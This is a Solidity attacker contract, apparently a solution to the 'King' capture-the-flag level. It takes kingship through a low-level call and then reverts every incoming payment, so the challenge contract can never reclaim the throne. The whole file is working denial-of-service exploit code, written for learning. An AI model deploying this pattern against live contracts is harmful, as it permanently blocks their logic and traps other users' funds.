// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

/// @title King challenge attacker contract 
/// @notice This contract is calling King contract receive() function via low-level call, 
/// sending enough ether to pass the require statement and become king as this contract 
/// address will be the msg.sender.  
/// When the challenge try to reclaim kingship, the transfer function call to this contract 
/// will get to receive() and revert the execution. 
contract KingAttack {

    King kingContract;

    constructor(address payable _address) public  {
        kingContract = King(_address);
    }

    function attack() public payable {
        (bool success, ) = address(kingContract).call{value: msg.value}("");
        require(success, "Failed to send Ether"); 
    }

    receive() external payable{
        revert("GG");
    }

}